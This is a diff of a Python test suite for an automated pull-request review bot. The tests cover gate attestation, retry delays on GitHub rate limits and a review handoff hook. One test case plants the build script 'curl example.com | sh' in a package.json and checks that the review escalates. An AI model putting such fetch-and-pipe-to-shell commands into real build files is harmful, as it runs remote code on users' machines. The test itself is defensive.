@@ -15,7 +15,7 @@ from django.utils import timezone
 import requests
 from celery.exceptions import Retry
 
-from posthog.egress.github.transport import GitHubRateLimitError
+from posthog.egress.github.transport import GitHubEgressBudgetExhausted, GitHubRateLimitError
 from posthog.models import OAuthAccessToken, Team
 from posthog.models.instance_setting import override_instance_config
 from posthog.models.integration import Integration
@@ -31,13 +31,14 @@ from products.stamphog.backend.facade.enums import (
     ReviewRunStatus,
     ReviewVerdict,
 )
+from products.stamphog.backend.facade.finished_review_hooks import FinishedReviewRun
 from products.stamphog.backend.facade.review_evidence import ReviewEvidence, ReviewEvidenceProvider, ReviewEvidenceState
 from products.stamphog.backend.logic.channel_resolution import (
     RoutingContext,
     build_routing_context,
     resolve_destination,
 )
-from products.stamphog.backend.logic.engine_pregate import EnginePregateError, pregate_skip_reason
+from products.stamphog.backend.logic.engine_pregate import EnginePregateError, GateAttestation, pregate_skip_reason
 from products.stamphog.backend.logic.github_client import STICKY_COMMENT_MARKER, StamphogGitHubClient
 from products.stamphog.backend.logic.slack_digest import _THREAD_LEAD
 from products.stamphog.backend.models import DigestRun, PullRequest, PullRequestAudience, ReviewRun, StamphogRepoConfig
@@ -48,6 +49,7 @@ from products.stamphog.backend.temporal.activities import (
     MarkReviewFailedInput,
     ReviewSandboxInput,
     StamphogReviewInput,
+    _attest_gates,
     destroy_review_sandbox,
     dismiss_stale_approvals,
     fetch_review_context,
@@ -201,8 +203,21 @@ def _make_pr_with_review(
     return pull_request
 
 
+@pytest.fixture
+def handoff():
+    hook = MagicMock()
+    with patch(FINISHED_REVIEW_HOOKS, return_value=(hook,)):
+        yield hook
+
+
+def _external_review_requests(hook: MagicMock) -> list[FinishedReviewRun]:
+    return [c.args[0] for c in hook.call_args_list if c.args[0].request_external_review]
+
+
 @pytest.mark.django_db(databases=PRODUCT_DATABASES)
-def test_signed_webhook_drives_review_and_posts_approval(team, stamphog_chain: StamphogChain) -> None:
+def test_signed_webhook_drives_review_and_posts_approval(
+    team, stamphog_chain: StamphogChain, handoff: MagicMock
+) -> None:
     # Regression guard: the webhook -> capture -> review -> post chain wiring. A signed opened
     # delivery must create the PR + ReviewRun, run the review activities, and post an APPROVE
     # review to GitHub pinned to the reviewed head SHA.
@@ -293,19 +308,136 @@ def test_signed_webhook_drives_review_and_posts_approval(team, stamphog_chain: S
     assert len(additions) == 1
     assert [r["reaction_id"] for r in removals] == [additions[0]["id"]]
 
-    # An APPROVED verdict never hands off to ReviewHog — the posthog-review label is a refusal-only signal.
-    assert [w for w in recorder.github_writes if w["kind"] == "add_label"] == []
+    # An APPROVED verdict never hands off to ReviewHog — the handoff is a refusal-only signal.
+    assert _external_review_requests(handoff) == []
+
+
+@pytest.mark.django_db(databases=PRODUCT_DATABASES)
+def test_a_sandbox_approval_the_worker_gates_do_not_confirm_is_escalated(team, stamphog_chain: StamphogChain) -> None:
+    repo_config = _repo_config(team.id)
+    recorder = stamphog_chain.recorder
+    author, head_sha = "devex-dev", "sha102a"
+    recorder.register_pr(REPO, 102, _pr_object(102, author, head_sha), [_api_file("src/util.py")])
+    stamphog_chain.attest_gates.return_value = GateAttestation(
+        attested=False, reason="gate_failed", gates=[{"gate": "deny-list", "passed": False, "message": "denied"}]
+    )
+
+    stamphog_chain.post_webhook(_opened_event(102, author, head_sha), delivery_id=str(uuid.uuid4()))
+
+    pr = PullRequest.objects.for_team(team.id).get(repo_config=repo_config, pr_number=102)
+    run = ReviewRun.objects.for_team(team.id).filter(pull_request=pr).latest("created_at")
+    assert (run.status, run.verdict, run.posted_review_id) == (
+        ReviewRunStatus.COMPLETED,
+        ReviewVerdict.ESCALATE,
+        None,
+    )
+    assert run.output["gate_attestation"]["reason"] == "gate_failed"
+    assert run.gate_result is not None
+    assert run.gate_result["attestation"]["reason"] == "gate_failed"
+    (review,) = [w for w in recorder.github_writes if w["kind"] == "comment_review"]
+    assert "could not confirm its own checks" in review["body"]["body"]
+
+    stamphog_chain.attest_gates.reset_mock()
+    stamphog_chain.attest_gates.return_value = GateAttestation(attested=True, reason="", gates=[])
+    _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))
+
+    stamphog_chain.attest_gates.assert_not_called()
+    assert [w for w in recorder.github_writes if w["kind"] == "approve_review"] == []
 
 
 def _api_file(filename: str) -> dict:
     return {"filename": filename, "status": "modified", "additions": 8, "deletions": 1, "patch": "@@ -1 +1 @@"}
 
 
+def _as_api_file(entry: str | dict) -> dict:
+    return _api_file(entry) if isinstance(entry, str) else entry
+
+
+_MANIFEST_BASE = '{"name": "web", "version": "1.0.0", "scripts": {"build": "vite build"}}\n'
+
+
+@pytest.mark.parametrize(
+    "files, compare_files, manifest_head, head_link, expect_reason",
+    [
+        pytest.param(["src/util.py"], ["src/util.py"], None, None, "", id="pinned-list-matches"),
+        pytest.param(["src/util.py"], ["terraform/main.tf"], None, None, "file_list_moved", id="pinned-list-moved"),
+        pytest.param(
+            [{**_api_file("src/new/util.py"), "status": "renamed", "previous_filename": "src/old/util.py"}],
+            [
+                {**_api_file("src/old/util.py"), "status": "removed"},
+                {**_api_file("src/new/util.py"), "status": "added"},
+            ],
+            None,
+            None,
+            "file_list_moved",
+            id="pinned-rename-split-into-delete-and-add",
+        ),
+        pytest.param(
+            ["frontend/package.json"],
+            ["frontend/package.json"],
+            _MANIFEST_BASE.replace("1.0.0", "1.0.1"),
+            None,
+            "",
+            id="manifest-version-bump",
+        ),
+        pytest.param(
+            ["frontend/package.json"],
+            ["frontend/package.json"],
+            _MANIFEST_BASE.replace("vite build", "curl example.com | sh"),
+            None,
+            "gate_failed",
+            id="manifest-script-edit",
+        ),
+        pytest.param(
+            ["frontend/package.json"],
+            ["frontend/package.json"],
+            None,
+            "package.base.json",
+            "gate_failed",
+            id="manifest-replaced-by-a-symlink",
+        ),
+    ],
+)
+@pytest.mark.django_db(databases=PRODUCT_DATABASES)
+def test_the_worker_attests_from_the_reviewed_commits(
+    team,
+    stamphog_chain: StamphogChain,
+    files: list[str | dict],
+    compare_files: list[str | dict],
+    manifest_head: str | None,
+    head_link: str | None,
+    expect_reason: str,
+) -> None:
+    repo_config = _repo_config(team.id)
+    recorder = stamphog_chain.recorder
+    author, head_sha = "devex-dev", "sha103a"
+    recorder.register_pr(REPO, 103, _pr_object(103, author, head_sha), [_as_api_file(entry) for entry in files])
+    recorder.compare_files = [_as_api_file(entry) for entry in compare_files]
+    if manifest_head is not None or head_link is not None:
+        recorder.files_at_ref[("frontend/package.json", recorder.merge_base_sha)] = _MANIFEST_BASE
+    if manifest_head is not None:
+        recorder.files_at_ref[("frontend/package.json", head_sha)] = manifest_head
+    if head_link is not None:
+        recorder.repo_symlinks[(REPO, "frontend/package.json")] = head_link
+    stamphog_chain.attest_gates.side_effect = _attest_gates
+
+    with patch.object(activities, "fetch_folder_policy_files", return_value={}):
+        stamphog_chain.post_webhook(_opened_event(103, author, head_sha), delivery_id=str(uuid.uuid4()))
+
+    pr = PullRequest.objects.for_team(team.id).get(repo_config=repo_config, pr_number=103)
+    run = ReviewRun.objects.for_team(team.id).filter(pull_request=pr).latest("created_at")
+    assert run.output["gate_attestation"]["reason"] == expect_reason
+    approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
+    assert (run.verdict, len(approvals)) == (
+        (ReviewVerdict.APPROVED, 1) if not expect_reason else (ReviewVerdict.ESCALATE, 0)
+    )
+
+
 def _big_api_file(filename: str, additions: int) -> dict:
     return {**_api_file(filename), "additions": additions, "deletions": 0}
 
 
-_LIFTING_FOLDER_FILE = "---\nstamphog:\n  size_gate:\n    max_lines: 1000\n---\nTall PRs are normal here.\n"
+_LIFTING_FOLDER_FILE = "---\nstamphog:\n  size_gate:\n    max_lines: 1500\n---\nTall PRs are normal here.\n"
 
 
 @pytest.mark.parametrize(
@@ -342,10 +474,16 @@ _LIFTING_FOLDER_FILE = "---\nstamphog:\n  size_gate:\n    max_lines: 1000\n---\n
             id="pending-migration",
         ),
         pytest.param(
-            [_big_api_file("lib/big.py", 900)], None, False, False, "final:REFUSED", "too large", id="size-folders-read"
+            [_big_api_file("lib/big.py", 1300)],
+            None,
+            False,
+            False,
+            "final:REFUSED",
+            "too large",
+            id="size-folders-read",
         ),
         pytest.param(
-            [_big_api_file("lib/big.py", 900)],
+            [_big_api_file("lib/big.py", 1300)],
             None,
             False,
             True,
@@ -356,7 +494,7 @@ _LIFTING_FOLDER_FILE = "---\nstamphog:\n  size_gate:\n    max_lines: 1000\n---\n
         # sym/AGENT_APPROVALS.md is a symlink out of the repo, which the sandbox would follow, so the
         # folder files are unknown and the size band stays with the sandbox.
         pytest.param(
-            [_big_api_file("sym/big.py", 900)],
+            [_big_api_file("sym/big.py", 1300)],
             None,
             False,
             False,
@@ -366,7 +504,7 @@ _LIFTING_FOLDER_FILE = "---\nstamphog:\n  size_gate:\n    max_lines: 1000\n---\n
         ),
         # The PR head's src/AGENT_APPROVALS.md lifts the ceiling, so the sandbox review must decide.
         pytest.param(
-            [_big_api_file("src/deep/big.py", 900)],
+            [_big_api_file("src/deep/big.py", 1300)],
             None,
             False,
             False,
@@ -515,6 +653,29 @@ def test_failure_once_the_sandbox_exists_is_not_retried(team, stamphog_chain: St
     # The marker only saves a run from a second bill while the policy excludes it and retries the rest.
     assert SANDBOX_RETRY_POLICY.maximum_attempts > 1
     assert SandboxPhaseError.__name__ in (SANDBOX_RETRY_POLICY.non_retryable_error_types or [])
+
+
+@pytest.mark.django_db(databases=PRODUCT_DATABASES)
+def test_a_head_that_moved_before_the_fetch_supersedes_the_run_quietly(team, stamphog_chain: StamphogChain) -> None:
+    # The push that moved the head queues the review of the new head. A failure notice would ask the
+    # author to push again, and a failure event would count a routine race as breakage.
+    _repo_config(team.id)
+    recorder = stamphog_chain.recorder
+    author, head_sha = "devex-dev", "sha119a"
+    recorder.register_pr(REPO, 119, _pr_object(119, author, head_sha), _pr_files())
+    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"
+    stamphog_chain.sandbox_class.head_fetch_exit_code = activities._HEAD_MOVED_EXIT_CODE
+
+    capture_fn = MagicMock()
+    with patch("products.stamphog.backend.temporal.activities.ph_scoped_capture") as mock_capture_cm:
+        mock_capture_cm.return_value.__enter__.return_value = capture_fn
+        mock_capture_cm.return_value.__exit__.return_value = False
+        stamphog_chain.post_webhook(_opened_event(119, author, head_sha), delivery_id=str(uuid.uuid4()))
+
+    run = ReviewRun.objects.for_team(team.id).latest("created_at")
+    assert run.status == ReviewRunStatus.SUPERSEDED
+    assert [w for w in recorder.github_writes if w["kind"] == "comment_review"] == []
+    assert "stamphog_review_failed" not in [c.kwargs.get("event") for c in capture_fn.call_args_list]
 
 
 @pytest.mark.django_db(databases=PRODUCT_DATABASES)
@@ -1370,8 +1531,9 @@ def test_fetch_review_context_carries_inline_review_threads(team, stamphog_chain
     recorder = stamphog_chain.recorder
     head_sha = "sha132a"
     recorder.register_pr(REPO, 132, _pr_object(132, "devex-dev", head_sha), _pr_files())
+    # The NUL byte stands for PR text that Postgres refuses in jsonb, which used to fail every review of the PR.
     recorder.review_threads[(REPO, 132)] = [
-        fakes.review_thread_node(path="src/util.py", comments=[("maintainer", "do not merge")], is_resolved=False)
+        fakes.review_thread_node(path="src/util.py", comments=[("maintainer", "do not\x00 merge")], is_resolved=False)
     ]
     pull_request = PullRequest.objects.for_team(team.id).create(
         team_id=team.id, repo_config=repo_config, pr_number=132, author_login="devex-dev"
@@ -1397,19 +1559,42 @@ def test_fetch_review_context_carries_inline_review_threads(team, stamphog_chain
 
 
 @pytest.mark.parametrize(
-    "error,attempt,expect_reported",
+    "error,attempt,expect_reported,retry_delay",
     [
-        pytest.param(StamphogGitHubError("bad gateway", status_code=502), 1, False, id="5xx_first_attempt"),
-        pytest.param(requests.Timeout("read timed out"), 2, False, id="timeout_second_attempt"),
-        pytest.param(StamphogGitHubError("bad gateway", status_code=502), 3, True, id="5xx_final_attempt"),
-        pytest.param(requests.Timeout("read timed out"), 3, True, id="timeout_final_attempt"),
-        pytest.param(StamphogGitHubError("not found", status_code=404), 1, True, id="4xx_first_attempt"),
-        pytest.param(StamphogGitHubError("truncated list"), 1, True, id="no_status_first_attempt"),
+        pytest.param(StamphogGitHubError("bad gateway", status_code=502), 1, False, None, id="5xx_first_attempt"),
+        pytest.param(requests.Timeout("read timed out"), 2, False, None, id="timeout_second_attempt"),
+        pytest.param(StamphogGitHubError("bad gateway", status_code=502), 3, True, None, id="5xx_final_attempt"),
+        pytest.param(requests.Timeout("read timed out"), 3, True, None, id="timeout_final_attempt"),
+        pytest.param(StamphogGitHubError("not found", status_code=404), 1, True, None, id="4xx_first_attempt"),
+        pytest.param(StamphogGitHubError("truncated list"), 1, True, None, id="no_status_first_attempt"),
+        pytest.param(
+            GitHubRateLimitError("secondary rate limit"), 1, False, timedelta(seconds=60), id="rate_limit_no_reset"
+        ),
+        pytest.param(
+            GitHubRateLimitError("rate limit", retry_after=120),
+            2,
+            False,
+            timedelta(seconds=120),
+            id="rate_limit_retry_after",
+        ),
+        pytest.param(GitHubRateLimitError("rate limit", retry_after=120), 3, True, None, id="rate_limit_final_attempt"),
+        pytest.param(
+            GitHubEgressBudgetExhausted("shed", scope=INSTALLATION_ID),
+            1,
+            False,
+            timedelta(seconds=60),
+            id="egress_budget_shed",
+        ),
     ],
 )
 @pytest.mark.django_db(databases=PRODUCT_DATABASES)
 def test_fetch_review_context_reports_transient_github_errors_only_on_final_attempt(
-    team, stamphog_chain: StamphogChain, error: Exception, attempt: int, expect_reported: bool
+    team,
+    stamphog_chain: StamphogChain,
+    error: Exception,
+    attempt: int,
+    expect_reported: bool,
+    retry_delay: timedelta | None,
 ) -> None:
     repo_config = _repo_config(team.id)
     head_sha = "sha134a"
@@ -1431,6 +1616,7 @@ def test_fetch_review_context_reports_transient_github_errors_only_on_final_atte
     # The activity fails either way, so a review never runs with incomplete context.
     assert is_expected_activity_failure(raised.value) is not expect_reported
     assert raised.value is error or raised.value.__cause__ is error
+    assert getattr(raised.value, "next_retry_delay", None) == retry_delay
 
 
 @pytest.mark.parametrize(
@@ -2133,7 +2319,7 @@ def _refused_engine_output() -> str:
 )
 @pytest.mark.django_db(databases=PRODUCT_DATABASES)
 def test_refused_verdict_strips_trigger_label_only_in_label_mode(
-    team, stamphog_chain: StamphogChain, review_mode: ReviewMode, expect_strip: bool
+    team, stamphog_chain: StamphogChain, handoff: MagicMock, review_mode: ReviewMode, expect_strip: bool
 ) -> None:
     # Action parity: in label-triggered mode a refusal removes the trigger label so the author
     # explicitly re-requests the next review; in ALL mode labels are never touched.
@@ -2166,7 +2352,7 @@ def test_refused_verdict_strips_trigger_label_only_in_label_mode(
     # Neither mode hands off to ReviewHog: this PR has a human author who reads the refusal, so a
     # second unrequested bot review is not stamphog's call to make. Only self-driving runs hand off
     # (test_refused_verdict_hands_off_to_reviewhog_only_when_self_driving).
-    assert [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "add_label"] == []
+    assert _external_review_requests(handoff) == []
 
 
 @pytest.mark.parametrize(
@@ -2188,6 +2374,7 @@ def test_refused_verdict_strips_trigger_label_only_in_label_mode(
 def test_refused_verdict_hands_off_to_reviewhog_only_when_self_driving(
     team,
     stamphog_chain: StamphogChain,
+    handoff: MagicMock,
     review_mode: ReviewMode,
     inbox_review: dict | None,
     expect_handoff: bool,
@@ -2219,46 +2406,23 @@ def test_refused_verdict_hands_off_to_reviewhog_only_when_self_driving(
 
     run.refresh_from_db()
     assert run.verdict == ReviewVerdict.REFUSED
-    label_adds = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "add_label"]
-    expected = [{"kind": "add_label", "repo": REPO, "number": 101, "labels": ["posthog-review"]}]
-    assert label_adds == (expected if expect_handoff else [])
+    requests = [(r.repository, r.pr_number, r.head_sha) for r in _external_review_requests(handoff)]
+    assert requests == ([(REPO, 101, head_sha)] if expect_handoff else [])
 
 
-@pytest.mark.parametrize(
-    "fault",
-    [
-        # The client swallows a 422 (label missing on the repo) itself; a 500 raises StamphogGitHubError.
-        pytest.param(422, id="swallows_missing_label"),
-        pytest.param(500, id="client_raises_on_500"),
-        # The egress layer raises these directly — not subclasses of StamphogGitHubError, so a narrow
-        # except would let them escape post_verdict and skip the durable verdict save below.
-        pytest.param(GitHubRateLimitError("secondary rate limit"), id="rate_limit_does_not_escape"),
-        pytest.param(requests.ConnectionError("network blip"), id="network_error_does_not_escape"),
-    ],
-)
 @pytest.mark.django_db(databases=PRODUCT_DATABASES)
 def test_refused_verdict_lands_even_when_reviewhog_handoff_fails(
-    team,
-    stamphog_chain: StamphogChain,
-    fault: int | Exception,
+    team, stamphog_chain: StamphogChain, handoff: MagicMock
 ) -> None:
     # The ReviewHog handoff is a secondary, cross-product notification that runs AFTER the durable
-    # terminal save, so the refusal itself is never at risk — it's already committed by the time the
-    # handoff fires. Left uncaught, though, the exception would fail the activity and trigger a retry,
-    # re-running already-succeeded side effects (posting the sticky comment, stripping the trigger
-    # label) even though the verdict is saved; catching it keeps the handoff single-shot best-effort.
-    # A 422 is swallowed inside the client; a 500 raises StamphogGitHubError; a rate limit raises
-    # GitHubRateLimitError and a network blip raises requests.RequestException from the egress layer.
-    # All four must leave the run COMPLETED + REFUSED, not FAILED. The latter two are the regression:
-    # they are not subclasses of StamphogGitHubError, so only a broad catch at the call site contains
-    # them. The run carries inbox provenance because only a self-driving refusal reaches the handoff.
+    # terminal save, so the refusal itself is never at risk. Left uncaught, though, the hook's exception
+    # would fail the activity and trigger a retry, re-running already-succeeded side effects (posting
+    # the sticky comment, stripping the trigger label). The run carries inbox provenance because only a
+    # self-driving refusal reaches the handoff.
     repo_config = _repo_config(team.id)
     head_sha = "sha-refused-handoff"
     stamphog_chain.recorder.register_pr(REPO, 101, _pr_object(101, "devex-dev", head_sha))
-    if isinstance(fault, Exception):
-        stamphog_chain.recorder.add_label_side_effect = fault
-    else:
-        stamphog_chain.recorder.add_label_response_override = fakes.FakeResponse(fault, text="handoff failure")
+    handoff.side_effect = RuntimeError("handoff failure")
     pull_request = PullRequest.objects.for_team(team.id).create(
         team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
     )
@@ -2278,11 +2442,13 @@ def test_refused_verdict_lands_even_when_reviewhog_handoff_fails(
 
 
 @pytest.mark.django_db(databases=PRODUCT_DATABASES)
-def test_superseded_refusal_does_not_hand_off_to_reviewhog(team, stamphog_chain: StamphogChain) -> None:
+def test_superseded_refusal_does_not_hand_off_to_reviewhog(
+    team, stamphog_chain: StamphogChain, handoff: MagicMock
+) -> None:
     # The ReviewHog handoff runs AFTER the conditional terminal save, so a refusal that loses the save
     # to a supersession (a synchronize/re-review delivery landing between the head guard and the save)
     # must not trigger ReviewHog for the stale refusal — a newer run may approve the same head. The run
-    # returns skipped_superseded and the posthog-review label is never added. The run carries inbox
+    # returns skipped_superseded and the handoff never runs. The run carries inbox
     # provenance so the supersession is what blocks the handoff, not the self-driving-only condition.
     repo_config = _repo_config(team.id)
     head_sha = "sha-refused-superseded"
@@ -2311,7 +2477,7 @@ def test_superseded_refusal_does_not_hand_off_to_reviewhog(team, stamphog_chain:
         result = _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))
 
     assert result == {"verdict": "skipped_superseded"}
-    assert [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "add_label"] == []
+    handoff.assert_not_called()
 
 
 @pytest.mark.parametrize(
